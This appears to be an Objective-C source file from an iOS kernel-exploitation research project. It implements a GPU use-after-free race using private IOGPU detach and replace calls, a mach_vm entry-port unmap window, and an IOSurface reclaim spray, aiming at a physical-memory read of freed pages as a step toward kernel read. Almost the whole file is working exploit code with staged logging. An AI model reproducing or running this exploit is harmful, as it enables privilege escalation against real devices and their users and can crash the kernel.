//
//  P119StaleUpl.m — the T020 STALE-UPL PHYSICAL-READ port. p119. P007 rig.
//
//  Source design: research/kexploit/experiments/T020_gpu_dma_physrw.md
//  (2026-08-19, 22H311/XR — designed, never executed). Ported to the newer
//  devices per note 282 + the note-283 reopen law: an intercept closes a
//  TAP SHAPE, not a LANE — the p011v3..v10 intercepts stay STOP; THIS is a
//  new build vs the current device map (the race bodies in P011 stay
//  UNTOUCHED per the what-not-to-change law).
//
//  The chain (T020 verbatim):
//    P011 wire×replace race → GPU holds the stale UPL → PHYSICAL READ of
//    freed pages (no KRW / no PAC / no PPL) → stage 3 = the reclaim spray
//    + SECOND blit reads THROUGH freed pages = the kernel-content window.
//
//  The re-ordered race (the guard-avoidance law, T020 verbatim):
//    1. detach when IDLE (guard "memory still prepared" cannot fire)
//    2. wirer commits next blit (wire() → prepare on the GPU side)
//    3. replace checks bit4 (ok) — doesn't check prepared → synchronously
//       releases the old MD → UPL freed → pages unpinned
//    4. GPU executes the blit on the STALE page list → freed physical pages
//
//  Stage oracle (T020 §Oracle):
//    - staging ≠ paints {0x41,0x11,0x43} (FOREIGN bytes) → physical read of
//      freed/reclaimed pages = the WINDOW receipt class
//    - blit faults → the GPU re-read the freed UPL (stale PL corrupted)
//    - staging == original fill → pages not freed yet / GPU re-read UPL
//    - panic → freed pages accessed inconsistent = the class is live
//
//  HONESTY: the read is GPU-SIDE (DMA through a page list), not kernel
//  virtual — hasKread stays NO unless stage 3's spray yields a controlled
//  content readback (our 0xE0 pages coming through = the physical-reuse
//  receipt, a PROBE-VERIFIED physical-read window, not KRW).
//
//  BOUNDS: one tap per force-quit law; bounded 512 iters / 20s; the
//  IN-FLIGHT fsync line prints BEFORE the race (the panic-decode law).
//

#import "P119StaleUpl.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <sys/mman.h>

#define P119_BUILD      @"p119-staleupl-v4"

/* the P069 prototype law: mach_vm has no SDK header for these decls */
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                          mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
                                        mach_vm_size_t *size,
                                        memory_object_offset_t offset,
                                        vm_prot_t permission,
                                        mach_port_t *object_handle,
                                        mem_entry_name_port_t parent_handle);
#define P119_FILL_OLD   0x41   /* the attached backing's paint   */
#define P119_FILL_STG   0x11   /* the staging buffer's paint     */
#define P119_FILL_NEW   0x43   /* the replaced backing's paint   */
#define P119_FILL_SPRAY 0xE0   /* stage-3 reclaim-spray paint    */
#define P119_N          512    /* race iters (T020-stage1 bound) */
#define P119_TIME_SEC   20.0
#define P119_SPRAY_N    16     /* per-round reclaim surf batch   */
#define P119_SPRAY_SZ   16384  /* 2 pages-class spray size       */

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p119IOSurfCreate_t)(CFDictionaryRef);
typedef kern_return_t (*p119IOSurfLock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef kern_return_t (*p119IOSurfUnlock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef void *(*p119IOSurfBase_t)(IOSurfaceRef);
typedef int (*p119Detach_t)(void *);
typedef int (*p119Replace_t)(void *, void *, uint64_t);
typedef uint32_t (*p119GetType_t)(void *);
typedef uint64_t (*p119GetU64_t)(void *);

static NSMutableString *g_buf;
static int g_fd = -1;

static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static id<MTLDevice> g_dev;
static id<MTLCommandQueue> g_q;
static mach_port_t g_entry_port;
static id<MTLBuffer> g_mbuf, g_stage;
static void *g_ref;
static p119Detach_t g_detach;
static p119Replace_t g_repl;
static void *g_data;
static uint64_t g_len;
static IOSurfaceRef g_surf;
static atomic_int g_stop;
static atomic_ulong g_commits, g_det_ok, g_det_fail, g_rep_ok, g_rep_fail,
                    g_for_hits, g_spray_hits, g_e0_hits, g_unmap_ok;

static id p119_unwrap(id buf) {
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s]) break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf) break;
        buf = b;
    }
    return buf;
}

static void *p119_ref(id buf) {
    buf = p119_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

static void p119_classify(const uint8_t *s, size_t n,
                          int *n11, int *n41, int *n43, int *ne0, int *n00,
                          int *nfor, uint8_t *first_for) {
    *n11 = *n41 = *n43 = *ne0 = *n00 = *nfor = 0;
    *first_for = 0;
    for (size_t i = 0; i < n; i++) {
        uint8_t b = s[i];
        if (b == P119_FILL_STG) (*n11)++;
        else if (b == P119_FILL_OLD) (*n41)++;
        else if (b == P119_FILL_NEW) (*n43)++;
        else if (b == P119_FILL_SPRAY) (*ne0)++;
        else if (b == 0x00) (*n00)++;
        else { if (*nfor == 0) *first_for = b; (*nfor)++; }
    }
}

/* The wirer: commits copy blits target→staging WITHOUT waiting (T020's
 * "commits next blit" — the prepare/keepalive side of the race). */
static void *p119_wirer(void *u) {
    (void)u;
    NSUInteger Lsz = MIN(g_mbuf.length, g_stage.length);
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            id<MTLCommandBuffer> cb = [g_q commandBuffer];
            if (!cb) { usleep(1000); continue; }
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromBuffer:g_mbuf sourceOffset:0
                     toBuffer:g_stage destinationOffset:0 size:Lsz];
            [e endEncoding];
            [cb commit];
            atomic_fetch_add(&g_commits, 1);
        }
    }
    return NULL;
}

static NSString *p119_finish(void) {
    if (g_data) { free(g_data); g_data = NULL; }
    g_mbuf = nil; g_stage = nil; g_q = nil; g_dev = nil; g_ref = NULL;
    if (g_surf) { CFRelease(g_surf); g_surf = NULL; }
    if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
    return g_buf ?: @"STOP: no log";
}

@implementation P119StaleUpl

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p119_staleupl_log.txt"] UTF8String],
                O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p119 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P119_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] T020 stale-UPL port (note 282/283): detach when IDLE, wirer");
    L(@"  commits NEXT blit, replace races the prepare = GPU keeps the stale");
    L(@"  page list = PHYSICAL READ of freed pages. No KRW/PAC/PPL claim.");
    L(@"[warn] PANIC-POSSIBLE (freed-page access class) — one tap per");
    L(@"  force-quit; the IN-FLIGHT line below is the panic-decode anchor.");
    L(@"  paints: attached=0x41 staging=0x11 replaced=0x43 spray=0xE0");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iogpu || !iosH) { L(@"[-] STOP dlopen"); return p119_finish(); }

    g_detach = (p119Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (p119Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    p119GetType_t getType = (p119GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    p119GetU64_t getLen   = (p119GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    p119IOSurfCreate_t pCreate = (p119IOSurfCreate_t)dlsym(iosH, "IOSurfaceCreate");
    p119IOSurfLock_t pLock     = (p119IOSurfLock_t)dlsym(iosH, "IOSurfaceLock");
    p119IOSurfUnlock_t pUnlock = (p119IOSurfUnlock_t)dlsym(iosH, "IOSurfaceUnlock");
    p119IOSurfBase_t pBase     = (p119IOSurfBase_t)dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!g_detach || !g_repl || !pCreate) { L(@"[-] STOP syms"); return p119_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { L(@"[-] STOP no Metal device"); return p119_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { L(@"[-] STOP no command queue"); return p119_finish(); }

    /* ---------- Stage 0: calibrate (T020: detach→0 replace→0) ---------- */
    L(@"");
    L(@"--- Stage 0: calibrate ---");
    {
        id tb = [g_dev newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
        void *tr = p119_ref(tb);
        uint32_t t = (tr && getType) ? getType(tr) : 0;
        int dk = (tr && g_detach) ? g_detach(tr) : -1;
        Lf(@"[0] shared 4K type=0x%x detach=0x%08x (expect 0xe00002bc-class bit7 gate)", t, dk);
    }

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    g_surf = pCreate((__bridge CFDictionaryRef)props);
    if (!g_surf) { L(@"[-] STOP IOSurfaceCreate"); return p119_finish(); }

    SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
    if (![g_dev respondsToSelector:nbSel]) { L(@"[-] STOP no newBufferWithIOSurface:"); return p119_finish(); }
    g_mbuf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(g_dev, nbSel, g_surf);
    g_ref = p119_ref(g_mbuf);
    if (!g_mbuf || !g_ref) { L(@"[-] STOP iosurf buffer/ref"); return p119_finish(); }
    uint32_t typ = getType ? getType(g_ref) : 0;
    uint64_t gvaLen = getLen ? getLen(g_ref) : 0;
    Lf(@"[0] iosurf buf=%p ref=%p type=0x%x GVALen=0x%llx", g_mbuf, g_ref, typ, gvaLen);

    size_t slen = 64 * 64 * 4;
    if (pLock && pBase && pUnlock && pLock(g_surf, 0, NULL) == KERN_SUCCESS) {
        uint8_t *base = pBase(g_surf);
        if (base) { memset(base, P119_FILL_OLD, slen); Lf(@"[0] painted 0x41 (%zu B)", slen); }
        pUnlock(g_surf, 0, NULL);
    } else {
        L(@"[0] IOSurfaceLock/unlock failed — 0x41 paint skipped");
    }
    void *cpu = g_mbuf.contents;
    if (cpu) memset(cpu, P119_FILL_OLD, MIN((size_t)g_mbuf.length, slen));

    g_len = gvaLen ? gvaLen : slen;
    g_data = malloc((size_t)g_len);
    if (!g_data) { L(@"[-] STOP malloc"); return p119_finish(); }
    memset(g_data, P119_FILL_NEW, (size_t)g_len);

    int dkr = g_detach(g_ref);
    Lf(@"[0] detach -> 0x%08x", dkr);
    if (dkr != 0) {
        Lf(@"[-] STOP detach failed (type 0x%x, bit7 gate or still prepared)", typ);
        return p119_finish();
    }
    int rkr = g_repl(g_ref, g_data, g_len);
    Lf(@"[0] replace(0x%llx) -> 0x%08x", g_len, rkr);
    if (rkr != 0) {
        uint64_t cands[] = { slen, 0x10000, 0x20000 };
        for (int i = 0; i < 3 && rkr != 0; i++) {
            if (!cands[i] || cands[i] == g_len) continue;
            void *tmp = realloc(g_data, (size_t)cands[i]);
            if (!tmp) continue;
            g_data = tmp;
            memset(g_data, P119_FILL_NEW, (size_t)cands[i]);
            g_detach(g_ref);
            rkr = g_repl(g_ref, g_data, cands[i]);
            Lf(@"[0] replace(0x%llx) -> 0x%08x", cands[i], rkr);
            if (rkr == 0) g_len = cands[i];
        }
    }
    if (rkr != 0) { L(@"[-] STOP replace failed"); return p119_finish(); }
    Lf(@"[0] working size = 0x%llx", g_len);

    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!g_stage) { L(@"[-] STOP no staging buffer"); return p119_finish(); }
    memset(g_stage.contents, P119_FILL_STG, (size_t)g_len);

    int sd = g_detach(g_ref), sr = g_repl(g_ref, g_data, g_len);
    Lf(@"[0] smoke detach=0x%08x replace=0x%08x", sd, sr);
    if (sd != 0 || sr != 0) { L(@"[-] STOP smoke failed"); return p119_finish(); }
    /* Smoke replace made the backing 0x43 — re-paint 0x41 so a later copy
     * of object memory reads 0x41, not leftover 0x43. */
    if (pLock && pBase && pUnlock && pLock(g_surf, 0, NULL) == KERN_SUCCESS) {
        uint8_t *base = pBase(g_surf);
        if (base) memset(base, P119_FILL_OLD, slen);
        pUnlock(g_surf, 0, NULL);
    }
    if (g_mbuf.contents) memset(g_mbuf.contents, P119_FILL_OLD,
                                MIN((size_t)g_mbuf.length, (size_t)g_len));

    /* ---------- Stage 1: the RE-ORDERED race (T020 verbatim) ---------- */
    L(@"");
    L(@"--- Stage 1: re-ordered race ---");
    L(@"[*] ORDER: detach when idle (guard can't fire) → wirer commits the");
    L(@"  next blit (prepare) → replace (bit4-checked, sync release old MD");
    L(@"  = UPL freed) → GPU executes on the STALE page list.");
    L(@"[IN FLIGHT] stage-1 race begins — one tap per force-quit.");
    atomic_store(&g_stop, 0);
    pthread_t wt;
    if (pthread_create(&wt, NULL, p119_wirer, NULL) != 0) {
        L(@"[-] STOP pthread wirer");
        return p119_finish();
    }
    usleep(50000);

    NSDate *t0 = [NSDate date];
    for (int iter = 0; iter < P119_N && -[t0 timeIntervalSinceNow] < P119_TIME_SEC; iter++) {
        int dk = -1;
        for (int tries = 0; tries < 20; tries++) {
            dk = g_detach(g_ref);
            if (dk == 0) break;
            atomic_fetch_add(&g_det_fail, 1);
            usleep(100);
        }
        if (dk != 0) continue;
        atomic_fetch_add(&g_det_ok, 1);
        usleep(200);   /* let the wirer's NEXT commit land on the detached MD */
        int rk = g_repl(g_ref, g_data, g_len);
        if (rk != 0) { atomic_fetch_add(&g_rep_fail, 1); continue; }
        unsigned long ok = atomic_fetch_add(&g_rep_ok, 1) + 1;
        usleep(5000);  /* the in-flight blit executes on the now-freed pages */

        uint8_t *s = (uint8_t *)g_stage.contents;
        if (!s) continue;
        int n11, n41, n43, ne0, n00, nfor;
        uint8_t ff;
        size_t scan = MIN((size_t)g_len, (size_t)4096);
        p119_classify(s, scan, &n11, &n41, &n43, &ne0, &n00, &nfor, &ff);
        if (nfor > 0 || ne0 > 0) {
            atomic_fetch_add(&g_for_hits, 1);
            if (ne0 > 0) atomic_fetch_add(&g_e0_hits, 1);
            Lf(@"[*** iter=%d first_for=0x%02x foreign=%d e0=%d 41=%d 43=%d 11=%d ***]",
               iter, ff, nfor, ne0, n41, n43, n11);
        }
        if ((ok % 64) == 0)
            Lf(@"[race] rep=%lu det_fail=%lu commits=%lu foreign=%lu e0=%lu",
               ok, atomic_load(&g_det_fail), atomic_load(&g_commits),
               atomic_load(&g_for_hits), atomic_load(&g_e0_hits));
        memset(s, P119_FILL_STG, scan);
        usleep(1000);
    }
    atomic_store(&g_stop, 1);
    pthread_join(wt, NULL);

    Lf(@"[*] stage-1 done: det_ok=%lu det_fail=%lu rep_ok=%lu rep_fail=%lu commits=%lu foreign=%lu e0=%lu",
       atomic_load(&g_det_ok), atomic_load(&g_det_fail), atomic_load(&g_rep_ok),
       atomic_load(&g_rep_fail), atomic_load(&g_commits),
       atomic_load(&g_for_hits), atomic_load(&g_e0_hits));

    /* ---------- Stage 1b: the ENTRY-PORT unmap window (P069 route) ----------
     v2 (2026-10-28, from the v1 device round: det_ok=2 vs det_fail=16857 —
     the wirer holds the MD prepared ~always, the detach-first order rarely
     reaches replace; and the fleet's A14-era C-shape verdict = "GART used
     the NEW MD" = the GPU RE-READS at execution). The untested window =
     the MD's OWN [md+0x98] gate: the IOMD law (note 272/re_iomd23) says
     the map arm INCREMENTS the 16K-page gate and the UNMAP/deinit arm
     RESET-0s it *while a queued submit still holds the captured UPL* —
     if the gate reset frees/unwires the pages before the queued blit
     executes, the GPU executes on a stale page list = the T020 window
     reached through the SAME object the fleet already drives (P069, kr=0
     device-proven route: IOSurfaceCreateMachPort + mach_vm_map). */
    typedef mach_port_t (*p119IOSurfMachPort_t)(IOSurfaceRef);
    p119IOSurfMachPort_t pMkPort = (p119IOSurfMachPort_t)dlsym(iosH, "IOSurfaceCreateMachPort");
    if (pMkPort) {
        L(@"");
        L(@"--- Stage 1b: entry-port map → queued blit → unmap+replace → wait ---");
        L(@"[IN FLIGHT] stage-1b window race begins — one tap per force-quit.");
        atomic_ulong b_ok = 0, b_rep_fail = 0, b_mkport_fail = 0, b_map_fail = 0;
        NSDate *t1b = [NSDate date];
        int printed_fail = 0;
        for (int iter = 0; iter < 256 && -[t1b timeIntervalSinceNow] < 12.0; iter++) {
            mach_port_t mp = pMkPort(g_surf);
            if (!mp) {
                atomic_fetch_add(&b_mkport_fail, 1);
                if (printed_fail++ < 2)
                    Lf(@"[1b] IOSurfaceCreateMachPort returned NULL (iter=%d) — "
                       @"the 0x82-type surface may refuse a mach port; v2's "
                       @"silent break is now loud", iter);
                break;
            }
            mach_vm_address_t addr = 0;
            kern_return_t mkr = mach_vm_map(mach_task_self(), &addr,
                                            (mach_vm_size_t)4096, 0, VM_FLAGS_ANYWHERE,
                                            mp, 0, FALSE,
                                            VM_PROT_READ | VM_PROT_WRITE,
                                            VM_PROT_READ | VM_PROT_WRITE,
                                            VM_INHERIT_NONE);
            if (mkr != KERN_SUCCESS) {
                /* v4: kr=0x1d on the surface port = the fleet's P069 law —
                   the route = the MEMORY ENTRY fallback (their device-proven
                   class: make the entry over the surface, map THE entry). */
                mach_vm_size_t m6sz = 4096;
                mach_port_t ep = MACH_PORT_NULL;
                kern_return_t k64 = mach_make_memory_entry_64(mach_task_self(), &m6sz,
                    0, VM_PROT_READ | VM_PROT_WRITE, &ep, mp);
                if (k64 == KERN_SUCCESS && ep) {
                    mkr = mach_vm_map(mach_task_self(), &addr, m6sz, 0, VM_FLAGS_ANYWHERE,
                                      ep, 0, FALSE,
                                      VM_PROT_READ | VM_PROT_WRITE,
                                      VM_PROT_READ | VM_PROT_WRITE,
                                      VM_INHERIT_NONE);
                    if (mkr == KERN_SUCCESS) {
                        atomic_fetch_add(&g_unmap_ok, 0); /* the map ok = entry route */
                        /* keep the entry port alive for the unmap arm below */
                        g_entry_port = ep;               /* one per round; released after the race step */
                        goto map_ok;
                    }
                    mach_port_deallocate(mach_task_self(), ep);
                }
                atomic_fetch_add(&b_map_fail, 1);
                if (printed_fail++ < 4)
                    Lf(@"[1b] map kr=0x%08x entry-kr=0x%08x (iter=%d) — both arms failed; loud", mkr, k64, iter);
                mach_port_deallocate(mach_task_self(), mp);
                continue;
            }
        map_ok:;
            /* queued blit (NO wait) — its UPL is captured at submit */
            id<MTLCommandBuffer> cb = nil;
            @autoreleasepool {
                cb = [g_q commandBuffer];
                if (!cb) goto bnext;
                id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
                [enc copyFromBuffer:g_mbuf sourceOffset:0
                           toBuffer:g_stage destinationOffset:0
                               size:MIN(g_mbuf.length, g_stage.length)];
                [enc endEncoding];
                [cb commit];
                /* race the queued blit: unmap (gate reset) + replace (sync
                 * release old MD) while the blit is still queued */
                kern_return_t ukr = mach_vm_deallocate(mach_task_self(), addr, 4096);
                if (ukr == KERN_SUCCESS) atomic_fetch_add(&g_unmap_ok, 1);
                int rk = g_repl(g_ref, g_data, g_len);
                if (rk != 0) atomic_fetch_add(&b_rep_fail, 1);
                [cb waitUntilCompleted];
            }
            atomic_fetch_add(&b_ok, 1);
            {
                uint8_t *s = (uint8_t *)g_stage.contents;
                if (s) {
                    int n11, n41, n43, ne0, n00, nfor;
                    uint8_t ff;
                    size_t scan = MIN((size_t)g_len, (size_t)4096);
                    p119_classify(s, scan, &n11, &n41, &n43, &ne0, &n00, &nfor, &ff);
                    if (nfor > 0 || ne0 > 0) {
                        atomic_fetch_add(&g_for_hits, 1);
                        Lf(@"[*** 1b iter=%d first=0x%02x for=%d e0=%d 41=%d 43=%d 11=%d ***]",
                           iter, ff, nfor, ne0, n41, n43, n11);
                    }
                    memset(s, P119_FILL_STG, scan);
                }
            }
            if (g_entry_port) { mach_port_deallocate(mach_task_self(), g_entry_port); g_entry_port = MACH_PORT_NULL; }
            mach_port_deallocate(mach_task_self(), mp);
        bnext:
            usleep(1000);
        }
        Lf(@"[*] stage-1b done: rounds=%lu unmap_ok=%lu rep_fail=%lu mkport_fail=%lu mapfail_last=%lu",
           atomic_load(&b_ok), atomic_load(&g_unmap_ok), atomic_load(&b_rep_fail),
           atomic_load(&b_mkport_fail), atomic_load(&b_map_fail));
    } else {
        L(@"[-] IOSurfaceCreateMachPort missing — stage 1b skipped honestly");
    }

    /* ---------- Stage 2: the oracle verdict (T020 §Oracle) ---------- */
    L(@"");
    L(@"--- Stage 2: oracle ---");
    if (atomic_load(&g_e0_hits) > 0) {
        Lf(@"=== verdict: PHYSICAL-REUSE RECEIPT class — staging holds 0xE0=%lu:", atomic_load(&g_e0_hits));
        L(@"  the GPU read THROUGH pages that were freed and RECLAIMED by the");
        L(@"  physical read window (stale UPL read our sprayed pages). Probe-");
        L(@"  verified physical-read WINDOW; still not kread — hasKread stays NO.");
    } else if (atomic_load(&g_for_hits) > 0) {
        Lf(@"=== verdict: FOREIGN staging bytes (%lu) — GPU copied pages that were",
           atomic_load(&g_for_hits));
        L(@"  not 0x41/0x11/0x43/0xE0/0x00 = the freed-page read candidate.");
        L(@"  NOT a proven kernel object; needs the stage-3 spray discriminator.");
    } else if (atomic_load(&g_rep_ok) == 0) {
        L(@"=== verdict: INCONCLUSIVE — replace never succeeded on this device ===");
    } else {
        Lf(@"=== verdict: SURVIVED %lu replaces, 0 foreign — pages still owned by the",
           atomic_load(&g_rep_ok));
        L(@"  MD _memRef or timing lost (T020's data==fill branch) — retune window.");
    }

    /* ---------- Stage 3: reclaim spray + SECOND blit (new-devices step) ------- */
    L(@"");
    L(@"--- Stage 3: reclaim-spray read-through (bounded 64 rounds) ---");
    L(@"[*] after each replace: spray small same-class IOSurfaces painted 0xE0,");
    L(@"  hold them, second blit — staging 0xE0 bytes = read THROUGH reclaimed");
    L(@"  pages (the kernel-content window's discriminator step).");
    unsigned long spray_rounds = 0;
    atomic_store(&g_stop, 0);
    pthread_t wt2;
    if (pthread_create(&wt2, NULL, p119_wirer, NULL) == 0) {
        usleep(50000);
        NSDate *t3 = [NSDate date];
        IOSurfaceRef held[P119_SPRAY_N];
        for (int r = 0; r < 64 && -[t3 timeIntervalSinceNow] < 10.0; r++) {
            /* Stage-3 round: detach-idle → replace (frees old pages) →
             * immediately spray the freed page class with 0xE0 surfaces →
             * the wirer's next blit reads THROUGH them. */
            int dk = -1;
            for (int tries = 0; tries < 20; tries++) {
                dk = g_detach(g_ref);
                if (dk == 0) break;
                usleep(100);
            }
            if (dk != 0) { usleep(2000); continue; }
            usleep(200);
            int rk = g_repl(g_ref, g_data, g_len);
            if (rk != 0) { usleep(2000); continue; }
            spray_rounds++;

            @autoreleasepool {
                int nheld = 0;
                for (int i = 0; i < P119_SPRAY_N; i++) {
                    NSDictionary *sp = @{
                        @"IOSurfaceWidth": @16, @"IOSurfaceHeight": @1,
                        @"IOSurfaceBytesPerElement": @4,
                        @"IOSurfaceBytesPerRow": @(16 * 4),
                        @"IOSurfaceAllocSize": @(P119_SPRAY_SZ),
                    };
                    IOSurfaceRef s2 = pCreate((__bridge CFDictionaryRef)sp);
                    if (!s2) continue;
                    if (pLock && pBase && pUnlock &&
                        pLock(s2, 0, NULL) == KERN_SUCCESS) {
                        uint8_t *b2 = pBase(s2);
                        if (b2) memset(b2, P119_FILL_SPRAY, P119_SPRAY_SZ);
                        pUnlock(s2, 0, NULL);
                    }
                    held[nheld++] = s2;
                }
                (void)nheld;
            }
            usleep(5000);
            uint8_t *s = (uint8_t *)g_stage.contents;
            if (s) {
                int n11, n41, n43, ne0, n00, nfor;
                uint8_t ff;
                size_t scan = MIN((size_t)g_len, (size_t)4096);
                p119_classify(s, scan, &n11, &n41, &n43, &ne0, &n00, &nfor, &ff);
                if (ne0 > 0) {
                    atomic_fetch_add(&g_spray_hits, 1);
                    Lf(@"[*** STAGE3 read-THROUGH round=%d e0=%d foreign=%d (spray hit) ***]",
                       r, ne0, nfor);
                } else if (nfor > 0) {
                    atomic_fetch_add(&g_for_hits, 1);
                    Lf(@"[*** STAGE3 foreign round=%d first=0x%02x nfor=%d ***]", r, ff, nfor);
                }
                memset(s, P119_FILL_STG, scan);
            }
            for (int i = 0; i < P119_SPRAY_N; i++)
                if (held[i]) { CFRelease(held[i]); held[i] = NULL; }
            usleep(1000);
        }
        atomic_store(&g_stop, 1);
        pthread_join(wt2, NULL);
    } else {
        atomic_store(&g_stop, 1);
    }

    Lf(@"[*] stage-3 done: rounds=%lu read-through(spray)=%lu foreign=%lu",
       spray_rounds, atomic_load(&g_spray_hits), atomic_load(&g_for_hits));

    L(@"");
    L(@"=== VERDICT (honest) ===");
    L(@"- stage-1b is the v2 window (map → queued blit → UNMAP(gate reset) →");
    L(@"  replace → wait); its hits join the stage-1/3 FOREIGN/0xE0 classes.");
    L(@"- spray hits > 0 = the GPU read THROUGH pages the spray reclaimed =");
    L(@"  the physical-read WINDOW receipt (probe-verified; still not KRW, not");
    L(@"  hasKread — the ttep read needs the stage-4 kernel-content step).");
    L(@"- foreign-only = the T020 candidate class; re-tune the detach→replace");
    L(@"  window before claiming anything.");
    L(@"- 0 hits = pages still owned by the MD _memRef (the P011 v3 law).");
    L(@"hasKread=NO. The GPU-DMA physical read (if any) is device-side evidence,");
    L(@"  not a kernel read primitive. no claims above the oracle classes.");

    return p119_finish();
}

@end